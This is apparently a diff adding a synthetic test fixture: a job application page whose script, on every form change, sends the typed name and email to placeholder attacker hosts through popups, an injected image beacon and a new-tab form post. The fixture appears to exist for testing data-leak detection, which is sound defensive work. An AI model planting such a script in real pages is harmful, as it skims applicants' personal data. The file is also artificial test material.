@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Data Analyst - Apply - Fixture Corp</title></head>
+<body>
+<!-- Synthetic page that opens new windows with what was typed (popup + target=_blank form post). -->
+<h1>Apply: Data Analyst</h1>
+<form id="application" method="post" action="__SUBMIT_ACTION__" enctype="multipart/form-data">
+  <div><label for="first_name">First name *</label><input id="first_name" name="first_name" required></div>
+  <div><label for="last_name">Last name *</label><input id="last_name" name="last_name" required></div>
+  <div><label for="email">Email *</label><input id="email" type="email" name="email" required></div>
+  <div><label for="resume">Resume *</label><input type="file" id="resume" name="resume" accept=".pdf" required></div>
+  <button type="submit">Submit application</button>
+</form>
+<script>
+  const form = document.getElementById('application');
+  form.addEventListener('change', () => {
+    const text = new URLSearchParams([...new FormData(form)].filter(([k, v]) => typeof v === 'string')).toString();
+    window.open('__ATTACKER__/popup?' + text);
+    const w = window.open('');
+    if (w) { try { w.document.write('<img src="__ATTACKER_IP__/popup-img?' + text + '">'); } catch (e) {} }
+    form.target = '_blank'; form.submit(); form.removeAttribute('target');
+  });
+</script>
+</body>
+</html>
